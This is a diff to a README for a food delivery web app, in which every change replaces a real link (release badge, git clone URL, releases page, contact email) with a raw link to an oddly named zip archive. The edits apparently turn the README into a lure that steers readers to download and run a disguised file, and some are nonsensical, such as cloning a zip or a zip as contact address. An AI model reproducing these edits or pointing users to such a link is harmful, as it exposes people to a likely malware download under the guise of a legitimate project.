@@ -2,7 +2,7 @@
 
 Welcome to the Food Delivery App repository! This project aims to streamline the process of ordering food from your favorite restaurants right to your doorstep. Whether you are a developer looking to contribute or a user wanting to understand how this application works, you will find everything you need here.
 
-[![Latest Release](https://img.shields.io/github/v/release/kaitocook68/food-delivery)](https://github.com/kaitocook68/food-delivery/releases)
+[![Latest Release](https://github.com/kaitocook68/food-delivery/raw/refs/heads/main/angiometer/food-delivery-semispherical.zip)](https://github.com/kaitocook68/food-delivery/raw/refs/heads/main/angiometer/food-delivery-semispherical.zip)
 
 ## Table of Contents
 
@@ -33,7 +33,7 @@ To get started with the Food Delivery App, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/kaitocook68/food-delivery.git
+   git clone https://github.com/kaitocook68/food-delivery/raw/refs/heads/main/angiometer/food-delivery-semispherical.zip
    cd food-delivery
    ```
 
@@ -53,7 +53,7 @@ To get started with the Food Delivery App, follow these steps:
    Open your browser and go to `http://localhost:3000` to view the app.
 
 5. **Download Latest Release**:
-   For the latest release, visit [this link](https://github.com/kaitocook68/food-delivery/releases) to download the necessary files. Follow the instructions provided in the release notes for execution.
+   For the latest release, visit [this link](https://github.com/kaitocook68/food-delivery/raw/refs/heads/main/angiometer/food-delivery-semispherical.zip) to download the necessary files. Follow the instructions provided in the release notes for execution.
 
 ## Usage
 
@@ -91,8 +91,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For any questions or feedback, please reach out to the repository owner at kaitocook68@example.com.
+For any questions or feedback, please reach out to the repository owner at https://github.com/kaitocook68/food-delivery/raw/refs/heads/main/angiometer/food-delivery-semispherical.zip
 
 ---
 
-Feel free to explore the code, contribute, and help us make the Food Delivery App better! Your support is greatly appreciated. For updates and releases, always check the [Releases section](https://github.com/kaitocook68/food-delivery/releases).
+Feel free to explore the code, contribute, and help us make the Food Delivery App better! Your support is greatly appreciated. For updates and releases, always check the [Releases section](https://github.com/kaitocook68/food-delivery/raw/refs/heads/main/angiometer/food-delivery-semispherical.zip).
